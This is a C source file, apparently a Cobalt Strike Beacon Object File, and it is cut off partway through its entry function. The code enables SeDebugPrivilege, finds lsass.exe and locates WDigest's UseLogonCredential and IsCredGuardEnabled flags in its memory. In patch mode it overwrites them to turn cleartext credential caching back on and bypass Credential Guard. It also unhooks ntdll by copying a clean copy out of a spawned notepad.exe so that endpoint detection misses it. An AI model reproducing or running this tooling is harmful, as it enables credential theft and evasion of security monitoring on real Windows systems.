#include <stdint.h>
#include "bofdefs.h"

#ifdef BOF
#ifndef bufsize
#define bufsize 16384
#endif

#if defined(_MSC_VER)
#pragma data_seg(".data")
__declspec(allocate(".data"))
char* output = 0;  // this is just done so its we don't go into .bss which isn't handled properly

#pragma data_seg(".data")
__declspec(allocate(".data"))
WORD currentoutsize = 0;

#pragma data_seg(".data")
__declspec(allocate(".data"))
HANDLE trash = NULL; // Needed for x64 to not give relocation error

#elif defined(__GNUC__)
char* output __attribute__((section(".data"))) = 0;  // this is just done so its we don't go into .bss which isn't handled properly
WORD currentoutsize __attribute__((section(".data"))) = 0;
HANDLE trash __attribute__((section(".data"))) = NULL; // Needed for x64 to not give relocation error
#endif

int bofstart();
void internal_printf(const char* format, ...);
void printoutput(BOOL done);

int bofstart() {
	output = (char*)calloc(bufsize, 1);
	currentoutsize = 0;
	return 1;
}

void internal_printf(const char* format, ...) {
	int buffersize = 0;
	int transfersize = 0;
	char* curloc = NULL;
	char* intBuffer = NULL;
	va_list args;
	va_start(args, format);
	buffersize = vsnprintf(NULL, 0, format, args);
	va_end(args);

	if (buffersize == -1)
		return;

	char* transferBuffer = (char*)intAlloc(bufsize);
	intBuffer = (char*)intAlloc(buffersize);
	va_start(args, format);
	vsnprintf(intBuffer, buffersize, format, args);
	va_end(args);
	if (buffersize + currentoutsize < bufsize)
	{
		memcpy(output + currentoutsize, intBuffer, buffersize);
		currentoutsize += buffersize;
	}
	else {
		curloc = intBuffer;
		while (buffersize > 0)
		{
			transfersize = bufsize - currentoutsize;
			if (buffersize < transfersize)
			{
				transfersize = buffersize;
			}
			memcpy(output + currentoutsize, curloc, transfersize);
			currentoutsize += transfersize;
			if (currentoutsize == bufsize)
			{
				printoutput(FALSE);
			}
			memset(transferBuffer, 0, transfersize);
			curloc += transfersize;
			buffersize -= transfersize;
		}
	}
	intFree(intBuffer);
	intFree(transferBuffer);
}

void printoutput(BOOL done) {
	char* msg = NULL;
	BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
	currentoutsize = 0;
	memset(output, 0, bufsize);
	if (done) { free(output); output = NULL; }
}

#else
#include <stdio.h>
#define internal_printf(...) { \
	fprintf(stdout, __VA_ARGS__); \
}

#endif

int my_tolower(int c);
void to_lowercase(char* str);
int my_stricmp(const char* s1, const char* s2);
size_t my_strlen(const char* buffer);

int my_tolower(int c) {
    if (c >= 'A' && c <= 'Z') {
        return c + 32;
    }
    else {
        return c;
    }
}

void to_lowercase(char* str) {
    while (*str) {
        *str = my_tolower((unsigned char)*str);  // Convert each character to lowercase
        str++;
    }
}

int my_stricmp(const char* s1, const char* s2) {
    int i = 0;
    while (s1[i] != '\0' && s2[i] != '\0') {
        if (my_tolower(s1[i]) != my_tolower(s2[i])) {
            return my_tolower(s1[i]) - my_tolower(s2[i]);
        }
        i++;
    }
    return s1[i] - s2[i];
}

size_t my_strlen(const char* buffer)
{
    size_t len = 0;
    while (buffer[len] != '\0')
    {
        len++;
    }

    return len;
}

// Get SeDebugPrivilege privilege
bool EnableDebugPrivileges() {
    HANDLE currentProcess = (HANDLE)-1;
    HANDLE tokenHandle = NULL;

    // Open the process token
    NTSTATUS ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
    if (ntstatus != 0) {
        internal_printf("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
        return false;
    }

    // Set the privilege
    TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Luid.LowPart = 20; // LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid) would normally be used to get this value
    tokenPrivileges.Luid.HighPart = 0;
    tokenPrivileges.Attributes = 0x00000002;

    ntstatus = NtAdjustPrivilegesToken(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (ntstatus != 0) {
        internal_printf("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X. Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue.\n", ntstatus);
        NtClose(tokenHandle);
        return false;
    }

    // Close the handle
    if (tokenHandle != NULL) {
        NtClose(tokenHandle);
    }

    return true;
}

// Read remote IntPtr (8-bytes)
PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[8];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        internal_printf("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
        return NULL;
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}

// Read remote 16-bytes address
uintptr_t ReadRemoteUintptr_t(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[16];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(uintptr_t), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        internal_printf("[-] Error calling NtReadVirtualMemory (ReadRemoteUintptr_t). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
        return 0;
    }

    uintptr_t value = *(uintptr_t*)buff;
    return value;
}


// Read remote Unicode string
char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[256];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        internal_printf("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
    }

    char * unicode_str = (char*)malloc(128 + 1);
    int str_index = 0;

    for (int i = 0; i < sizeof(buff) - 1; i += 2) {
        if (buff[i] == 0 && buff[i + 1] == 0) {
            break;
        }
        wchar_t wch = *(wchar_t*)&buff[i];
        unicode_str[str_index++] = (char)wch;
    }
    unicode_str[str_index] = '\0';
    return unicode_str;
}


uintptr_t CustomGetModuleHandle(HANDLE hProcess, const char* dll_name) {
    int process_basic_information_size = 48;
    int peb_offset = 0x8;
    int ldr_offset = 0x18;
    int inInitializationOrderModuleList_offset = 0x30;
    int flink_dllbase_offset = 0x20;
    int flink_buffer_fulldllname_offset = 0x40;
    int flink_buffer_offset = 0x50;

    BYTE pbi_byte_array[48];
    void* pbi_addr = (void*)pbi_byte_array;
    ULONG ReturnLength;

    NTSTATUS ntstatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
    if (ntstatus != 0) {
        internal_printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return 0;
    }

    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
    void* pebaddress = *(void**)peb_pointer;
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
    if ((long long)ldr_adress == 0) {
        internal_printf("[-] PEB structure is not readable.\n");
        return 0;
    }
    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

    uintptr_t dll_base = (uintptr_t)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);

        dll_base = (uintptr_t)ReadRemoteUintptr_t(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));

        void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(hProcess, buffer);

        if (my_stricmp(base_dll_name, dll_name) == 0) {
            return dll_base;
        }
        free(base_dll_name);

        next_flink = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + 0x10));
    }

    return 0;
}


char* GetProcNameFromHandle(HANDLE process_handle) {
    const int process_basic_information_size = 48;
    const int peb_offset = 0x8;
    const int commandline_offset = 0x68;
    const int processparameters_offset = 0x20;

    unsigned char pbi_byte_array[process_basic_information_size];
    void* pbi_addr = NULL;
    pbi_addr = (void*)pbi_byte_array;

    // Query process information
    ULONG returnLength;
    NTSTATUS ntstatus = NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        internal_printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    // Get PEB Base Address
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;

    // Get PEB->ProcessParameters
    PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);

    // Get ProcessParameters->CommandLine
    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);
    PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
    char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);
    return commandline_value;
}

HANDLE GetProcessByName(const char* proc_name) {
    HANDLE aux_handle = NULL;
    while (NT_SUCCESS(NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle))) {
        char* current_proc_name = GetProcNameFromHandle(aux_handle);
        //to_lowercase(current_proc_name);
        if (current_proc_name && my_stricmp(current_proc_name, proc_name) == 0) {
            return aux_handle;
        }

        free(current_proc_name);
    }
    return NULL;
}


void* CustomGetProcAddress(void* pDosHdr, const char* func_name) {
    int exportrva_offset = 136;
    HANDLE hProcess = (HANDLE)-1;
    // DOS header (IMAGE_DOS_HEADER)->e_lfanew
    DWORD e_lfanew_value = 0;
    SIZE_T aux = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + 0x3C, &e_lfanew_value, sizeof(e_lfanew_value), &aux);
    // NT Header (IMAGE_NT_HEADERS)->FileHeader(IMAGE_FILE_HEADER)->SizeOfOptionalHeader
    WORD sizeopthdr_value = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + 20, &sizeopthdr_value, sizeof(sizeopthdr_value), &aux);
    // Optional Header(IMAGE_OPTIONAL_HEADER64)->DataDirectory(IMAGE_DATA_DIRECTORY)[0]->VirtualAddress
    DWORD exportTableRVA_value = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + exportrva_offset, &exportTableRVA_value, sizeof(exportTableRVA_value), &aux);
    if (exportTableRVA_value != 0) {
        // Read NumberOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->NumberOfNames
        DWORD numberOfNames_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x18, &numberOfNames_value, sizeof(numberOfNames_value), &aux);
        // Read AddressOfFunctions: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfFunctions
        DWORD addressOfFunctionsVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x1C, &addressOfFunctionsVRA_value, sizeof(addressOfFunctionsVRA_value), &aux);
        // Read AddressOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNames
        DWORD addressOfNamesVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x20, &addressOfNamesVRA_value, sizeof(addressOfNamesVRA_value), &aux);
        // Read AddressOfNameOrdinals: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNameOrdinals
        DWORD addressOfNameOrdinalsVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x24, &addressOfNameOrdinalsVRA_value, sizeof(addressOfNameOrdinalsVRA_value), &aux);
        void* addressOfFunctionsRA = (BYTE*)pDosHdr + addressOfFunctionsVRA_value;
        void* addressOfNamesRA = (BYTE*)pDosHdr + addressOfNamesVRA_value;
        void* addressOfNameOrdinalsRA = (BYTE*)pDosHdr + addressOfNameOrdinalsVRA_value;
        for (int i = 0; i < (int)numberOfNames_value; i++) {
            DWORD functionAddressVRA = 0;
            NtReadVirtualMemory(hProcess, addressOfNamesRA, &functionAddressVRA, sizeof(functionAddressVRA), &aux);
            void* functionAddressRA = (BYTE*)pDosHdr + functionAddressVRA;
            char functionName[256];
            NtReadVirtualMemory(hProcess, functionAddressRA, functionName, my_strlen(func_name) + 1, &aux);
            if (my_stricmp(functionName, func_name) == 0) {
                WORD ordinal = 0;
                NtReadVirtualMemory(hProcess, addressOfNameOrdinalsRA, &ordinal, sizeof(ordinal), &aux);
                void* functionAddress;
                NtReadVirtualMemory(hProcess, (BYTE*)addressOfFunctionsRA + ordinal * 4, &functionAddress, sizeof(functionAddress), &aux);
                uintptr_t maskedFunctionAddress = (uintptr_t)functionAddress & 0xFFFFFFFF;
                return (BYTE*)pDosHdr + (DWORD_PTR)maskedFunctionAddress;
            }
            addressOfNamesRA = (BYTE*)addressOfNamesRA + 4;
            addressOfNameOrdinalsRA = (BYTE*)addressOfNameOrdinalsRA + 2;
        }
    }
    return NULL;
}


bool SetValue(HANDLE processHandle, LPVOID address, uint32_t value) {
    ULONG bytesWritten;
    NTSTATUS ntstatus;

    ntstatus = NtWriteVirtualMemory(
        processHandle,
        address,
        &value,
        sizeof(uint32_t),
        &bytesWritten
    );

    if (ntstatus != 0 || bytesWritten != sizeof(uint32_t)) {
        internal_printf("Failed to write memory. Error code: %lu\n", GetLastError());
        return false;
    }

    return true;
}


bool ReadValues(HANDLE processHandle, void* address, BYTE* buffer, SIZE_T bufferLength) {
    SIZE_T bytesRead = 0;

    // Call NtReadVirtualMemory
    NTSTATUS ntstatus = NtReadVirtualMemory(processHandle, address, buffer, bufferLength, &bytesRead);

    // Check if the read was successful and all bytes were read
    if (ntstatus == 0 && bytesRead == bufferLength) {
        return true;
    }
    return false;
}


bool ParsePEFile(BYTE* buffer, size_t bufferSize, int* offset, int* useLogonCredential, int* isCredGuardEnabled, BYTE* matchedBytes) {
    *offset = 0;
    *useLogonCredential = 0;
    *isCredGuardEnabled = 0;
    memset(matchedBytes, 0, 18);

    // PE header location
    uint32_t peHeaderOffset = *(int32_t*)(buffer + 0x3C);
    uint32_t peSignature = *(uint32_t*)(buffer + peHeaderOffset);

    internal_printf("[+] peSignature:\t\t0x%08llx\n", peSignature);

    if (peSignature != 0x00004550) {
        internal_printf("Not a valid PE file.\n");
        return false;
    }

    uint16_t numberOfSections = *(uint16_t*)(buffer + peHeaderOffset + 6);
    uint16_t sizeOfOptionalHeader = *(uint16_t*)(buffer + peHeaderOffset + 20);
    int sectionHeadersOffset = peHeaderOffset + 24 + sizeOfOptionalHeader;

    for (int i = 0; i < numberOfSections; i++) {
        int sectionOffset = sectionHeadersOffset + (i * 40); // Each section header is 40 bytes
        char sectionName[9];
        memcpy(sectionName, buffer + sectionOffset, 8);
        sectionName[8] = '\0'; // Null-terminate
        if (my_stricmp(sectionName, ".text") == 0) {
            uint32_t virtualAddress = *(uint32_t*)(buffer + sectionOffset + 12);
            uint32_t rawDataPointer = *(uint32_t*)(buffer + sectionOffset + 20);
            uint32_t rawDataSize = *(uint32_t*)(buffer + sectionOffset + 16);
            // Search for pattern
            for (uint32_t j = rawDataPointer; j < rawDataPointer + rawDataSize - 11; j++) {
                if (j + 11 >= bufferSize) break;
                if (buffer[j] == 0x39 && buffer[j + 5] == 0x00 &&
                    buffer[j + 6] == 0x8b && buffer[j + 11] == 0x00) {
                    *offset = j + virtualAddress - rawDataPointer;
                    int count = 0;
                    for (uint32_t k = j; k < j + 18 && k < bufferSize; k++) {
                        matchedBytes[count++] = buffer[k];
                    }
                    // Extract values
                    if (j + 5 < bufferSize) {
                        *useLogonCredential = (buffer[j + 4] << 16) | (buffer[j + 3] << 8) | buffer[j + 2];
                        *isCredGuardEnabled = (buffer[j + 10] << 16) | (buffer[j + 9] << 8) | buffer[j + 8];
                    }
                    return true;
                }
            }
            internal_printf("Pattern not found.\n");
        }
    }
    return false;
}


BYTE* ReadDLL(HANDLE fileHandle, SIZE_T bufferSize) {
    BYTE* fileBytes = (BYTE*)malloc(bufferSize);
    if (!fileBytes) {
        internal_printf("Failed to allocate memory for fileBytes.\n");
        return NULL;
    }

    IO_STATUS_BLOCK ioStatusBlock = { 0 };
    LARGE_INTEGER byteOffset = { 0 };
    NTSTATUS status;

    // Call NtReadFile
    status = NtReadFile(
        fileHandle,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        fileBytes,
        bufferSize,
        &byteOffset,
        NULL
    );

    // Check status: 0x103 (STATUS_PENDING) is allowed
    if (status != 0 && status != 0x103) {
        internal_printf("Failed to read file. NTSTATUS: 0x%08X\n", status);
        free(fileBytes);
        return NULL;
    }

    return fileBytes; // Return the buffer
}


bool OpenFile(const wchar_t* filePath, HANDLE* fileHandle) {
    // Initialize UNICODE_STRING
    UNICODE_STRING unicodeString;
    unicodeString.Length = (USHORT)(wcslen(filePath) * sizeof(wchar_t));
    unicodeString.MaximumLength = (USHORT)((wcslen(filePath) + 1) * sizeof(wchar_t));
    unicodeString.Buffer = (PWSTR)filePath;

    // Set up OBJECT_ATTRIBUTES
    OBJECT_ATTRIBUTES objectAttributes;
    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    objectAttributes.RootDirectory = NULL;
    objectAttributes.ObjectName = &unicodeString;
    objectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
    objectAttributes.SecurityDescriptor = NULL;
    objectAttributes.SecurityQualityOfService = NULL;

    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status = NtCreateFile(
        fileHandle,
        FILE_READ_DATA | FILE_READ_ATTRIBUTES,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        0,
        FILE_SHARE_READ,
        FILE_OPEN,
        0,
        NULL,
        0
    );

    if (status != 0) {
        internal_printf("Failed to open file handle. NTSTATUS: 0x%08X\n", status);
        return false;
    }

    return true;
}

bool is64BitProcess() {
#ifdef _WIN64
    return true;
#else
    return false;
#endif
}


int* GetTextSectionInfo(LPVOID ntdll_address) {
    HANDLE hProcess = (HANDLE)-1;
    // Check MZ Signature (2 bytes)
    BYTE signature_dos_header[2];
    SIZE_T bytesRead;
    if ((NtReadVirtualMemory(hProcess, ntdll_address, signature_dos_header, 2, &bytesRead) != 0) || bytesRead != 2) {
        internal_printf("[-] Error reading DOS header signature\n");
        return NULL;
    }

    if (signature_dos_header[0] != 'M' || signature_dos_header[1] != 'Z') {
        internal_printf("[-] Incorrect DOS header signature\n");
        return NULL;
    }

    // Read e_lfanew (4 bytes) at offset 0x3C
    DWORD e_lfanew;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + 0x3C, &e_lfanew, 4, &bytesRead) != 0) || bytesRead != 4) {
        internal_printf("[-] Error reading e_lfanew\n");
        return NULL;
    }

    // Check PE Signature (2 bytes)
    BYTE signature_nt_header[2];
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew, signature_nt_header, 2, &bytesRead) != 0) || bytesRead != 2) {
        internal_printf("[-] Error reading NT header signature\n");
        return NULL;
    }

    if (signature_nt_header[0] != 'P' || signature_nt_header[1] != 'E') {
        internal_printf("[-] Incorrect NT header signature\n");
        return NULL;
    }

    // Check Optional Headers Magic field value (2 bytes)
    WORD optional_header_magic;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24, &optional_header_magic, 2, &bytesRead) != 0) || bytesRead != 2) {
        internal_printf("[-] Error reading Optional Header Magic\n");
        return NULL;
    }

    if (optional_header_magic != 0x20B && optional_header_magic != 0x10B) {
        internal_printf("[-] Incorrect Optional Header Magic field value\n");
        return NULL;
    }

    // Read SizeOfCode (4 bytes)
    DWORD sizeofcode;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 4, &sizeofcode, 4, &bytesRead) != 0) || bytesRead != 4) {
        internal_printf("[-] Error reading SizeOfCode\n");
        return NULL;
    }

    // Read BaseOfCode (4 bytes)
    DWORD baseofcode;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 20, &baseofcode, 4, &bytesRead) != 0) || bytesRead != 4) {
        internal_printf("[-] Error reading BaseOfCode\n");
        return NULL;
    }

    // Return BaseOfCode and SizeOfCode as an array
    int * result = (int*) malloc(2 * sizeof(int));
    result[0] = baseofcode;
    result[1] = sizeofcode;

    return result;
}


LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi = { 0 };

    BOOL createprocess_res = CreateProcessA(
        process_path,
        NULL,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS | CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!createprocess_res) {
        internal_printf("[-] Error calling CreateProcess\n");
        return NULL;
    }

    HANDLE currentProcess = (HANDLE)(-1);
    uintptr_t localNtdllHandle = CustomGetModuleHandle(currentProcess, "ntdll.dll");
    int* result = GetTextSectionInfo((void*)localNtdllHandle);
    int localNtdllTxtBase = result[0];
    int localNtdllTxtSize = result[1];
    LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle + localNtdllTxtBase);

    BYTE* ntdllBuffer = (BYTE*)malloc(localNtdllTxtSize);
    SIZE_T bytesRead;
    NTSTATUS readprocmem_res = NtReadVirtualMemory(
        pi.hProcess,
        localNtdllTxt,
        ntdllBuffer,
        localNtdllTxtSize,
        &bytesRead
    );

    if (readprocmem_res != 0) {
        internal_printf("[-] Error calling NtReadVirtualMemory\n");
        return NULL;
    }

    LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer;

    BOOL debugstop_res = DebugActiveProcessStop(pi.dwProcessId);
    NTSTATUS terminateproc_res = NtTerminateProcess(pi.hProcess, 0);
    if (!debugstop_res || (terminateproc_res != 0)) {
        internal_printf("[-] Error calling DebugActiveProcessStop or TerminateProcess\n");
        return NULL;
    }

    NTSTATUS closehandle_proc = NtClose(pi.hProcess);
    NTSTATUS closehandle_thread = NtClose(pi.hThread);
    if (closehandle_proc != 0 || closehandle_thread != 0) {
        internal_printf("[-] Error calling NtClose\n");
        return NULL;
    }

    free(result);

    return pNtdllBuffer;
}

// Overwrite hooked ntdll .text section with a clean version
void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
    ULONG dwOldProtection;
    HANDLE currentProcess = (HANDLE)(-1);
    SIZE_T aux = localNtdllTxtSize;
    NTSTATUS vp_res = NtProtectVirtualMemory(currentProcess, &localNtdllTxt, &aux, 0x80, &dwOldProtection);
    if (vp_res != 0) {
        internal_printf("[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY)\n");
        return;
    }

    //getchar();
    memcpy(localNtdllTxt, unhookedNtdllTxt, localNtdllTxtSize);

    // VirtualProtect back to the original protection
    NTSTATUS vp_res_2 = NtProtectVirtualMemory(currentProcess, &localNtdllTxt, &aux, dwOldProtection, &dwOldProtection);
    if (vp_res_2 != 0) {
        // if (!VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        internal_printf("[-] Error calling NtProtectVirtualMemory (dwOldProtection)\n");
        return;
    }
}

void RemapNtdll(bool debug) {
    const char* targetDll = "ntdll.dll";
    const char* proc_path = "C:\\Windows\\System32\\notepad.exe";

    if (debug) {
        internal_printf("[+] DLL remap:\t\t\ttrue\n");
    }

    long long unhookedNtdllTxt = (long long)MapNtdllFromDebugProc(proc_path);
    HANDLE currentProcess = (HANDLE)(-1);
    uintptr_t localNtdllHandle = CustomGetModuleHandle(currentProcess, targetDll);
    int* textSectionInfo = GetTextSectionInfo((void*)localNtdllHandle);
    int localNtdllTxtBase = textSectionInfo[0];
    int localNtdllTxtSize = textSectionInfo[1];
    long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;
    ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);

    if (debug) {
        internal_printf("[+] DLL remap completed:\tCopied %d bytes from 0x%llX to 0x%llX\n", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);
    }
}


void exec(DWORD option, bool debug) {
    const char* dllName = "wdigest.DLL";
    wchar_t filePath[MAX_PATH] = L"\\??\\C:\\Windows\\System32\\wdigest.dll";
    const char* proc_name = "c:\\windows\\system32\\lsass.exe";

    bool privilege_bool = EnableDebugPrivileges();
    if (debug && privilege_bool) {
        internal_printf("[+] Enable SeDebugPrivilege: \tOK\n");
    }
    else
    {
        internal_printf("[-] Enable SeDebugPrivilege Failed. Required Admin privileges!!!\n");
        return;
    }

    HANDLE fileHandle;
    SIZE_T bufferSize = 1024 * 1024; //default: 1MB

    // Open file
    bool openfile_bool = OpenFile(filePath, &fileHandle);
    if (debug && openfile_bool) {
        internal_printf("[+] File Handle:\t\t%llu\n", (ULONG_PTR)fileHandle);
    }

    // Read bytes
    BYTE* fileBuffer = ReadDLL(fileHandle, bufferSize);
    if (fileBuffer == NULL) {
        internal_printf("[-] Failed to read DLL.\n");
        return;
    }

    int offset = 0;
    int useLogonCredential = 0;
    int isCredGuardEnabled = 0;
    BYTE matchedBytes[18] = { 0 };

    // Parse PE File
    bool parse_bool = ParsePEFile(fileBuffer, bufferSize, &offset, &useLogonCredential, &isCredGuardEnabled, matchedBytes);
    if (!parse_bool) {
        internal_printf("[-] Failed to parse PE file.\n");
        return;
    }

    int useLogonCredential_Offset = useLogonCredential + offset + 6;
    int isCredGuardEnabled_Offset = isCredGuardEnabled + offset + 12;
    if (debug) {
        internal_printf("[+] Matched Bytes: \t\t");
        for (int i = 0; i < 18; i++) {
            internal_printf("%02X ", matchedBytes[i]);
        }
        internal_printf("\n");
        internal_printf("[+] Offset: \t\t\t0x%X\n", offset);
        internal_printf("[+] UseLogonCredential offset: \t0x%X (0x%X + offset +  6)\n", useLogonCredential_Offset, useLogonCredential);
        internal_printf("[+] IsCredGuardEnabled offset: \t0x%X (0x%X + offset +  6)\n", isCredGuardEnabled_Offset, isCredGuardEnabled);
    }

    HANDLE lsassHandle = GetProcessByName(proc_name);
    if (lsassHandle == 0) {
        internal_printf("[-] It was not possible to get lsass handle.\n");
        return;
    }
    if (debug) {
        internal_printf("[+] Lsass Handle:\t\t%llu\n", (ULONG_PTR)lsassHandle);
    }

    uintptr_t hModule = CustomGetModuleHandle(lsassHandle, dllName);
    // Other option is LoadLibrary: much simpler but there is not an equivalent in ntdll :(
    // uintptr_t hModule = (uintptr_t)LoadLibraryA("wdigest.dll");
    uintptr_t useLogonCredential_Address = hModule + useLogonCredential_Offset;
    uintptr_t isCredGuardEnabled_Address = hModule + isCredGuardEnabled_Offset;
    if (debug) {
        internal_printf("[+] DLL Base Address: \t\t0x%llX\n", (unsigned long long)hModule);
        internal_printf("[+] UseLogonCredential address:\t0x%llX (0x%llX + 0x%X)\n", (unsigned long long)useLogonCredential_Address, (unsigned long long)hModule, useLogonCredential_Offset);
        internal_printf("[+] IsCredGuardEnabled address:\t0x%llX (0x%llX + 0x%X)\n", (unsigned long long)isCredGuardEnabled_Address, (unsigned long long)hModule, isCredGuardEnabled_Offset);
    }

    if (option == 1) {
        // Write
        uint32_t useLogonCredential_Value = 1;
        uint32_t isCredGuardEnabled_Value = 0;
        bool setval_bool = SetValue(lsassHandle, (void*)useLogonCredential_Address, useLogonCredential_Value);
        if (debug && setval_bool)
        {
            internal_printf("[+] Wrote value %d to address: \t0x%llX (useLogonCredential)\n", useLogonCredential_Value, useLogonCredential_Address);
        }
        setval_bool = SetValue(lsassHandle, (void*)isCredGuardEnabled_Address, isCredGuardEnabled_Value);
        if (debug && setval_bool)
        {
            internal_printf("[+] Wrote value %d to address: \t0x%llX (isCredGuardEnabled)\n", isCredGuardEnabled_Value, isCredGuardEnabled_Address);
        }
    }

    // Read
    BYTE useLogonCredential_buffer[4] = { 0 };
    BYTE isCredGuardEnabled_buffer[4] = { 0 };
    bool readval_ulcr_bool = ReadValues(lsassHandle, (void*)useLogonCredential_Address, useLogonCredential_buffer, 4);
    bool readval_icge_bool = ReadValues(lsassHandle, (void*)isCredGuardEnabled_Address, isCredGuardEnabled_buffer, 4);

    if (debug && readval_ulcr_bool)
    {
        internal_printf("[+] UseLogonCredential value: \t%02X %02X %02X %02X\n", useLogonCredential_buffer[0], useLogonCredential_buffer[1], useLogonCredential_buffer[2], useLogonCredential_buffer[3]);
    }
    if (debug && readval_icge_bool)
    {
        internal_printf("[+] isCredGuardEnabled value: \t%02X %02X %02X %02X\n", isCredGuardEnabled_buffer[0], isCredGuardEnabled_buffer[1], isCredGuardEnabled_buffer[2], isCredGuardEnabled_buffer[3]);
    }

    if (fileHandle != NULL) {
        NtClose(fileHandle);
    }
    free(fileBuffer);
    return;
}


#ifdef BOF
void go(char* args, int len)
{
    CHAR* flag;
    bool debug = true;
	datap parser;

	BeaconDataParse(&parser, args, len);
	flag = BeaconDataExtract(&parser, NULL);

	if (!bofstart()) return;

    if (!my_stricmp(flag, "check") ){
        RemapNtdll(debug);
        exec(0, debug);
    }

    if (!my_stricmp(flag, "patch")) {
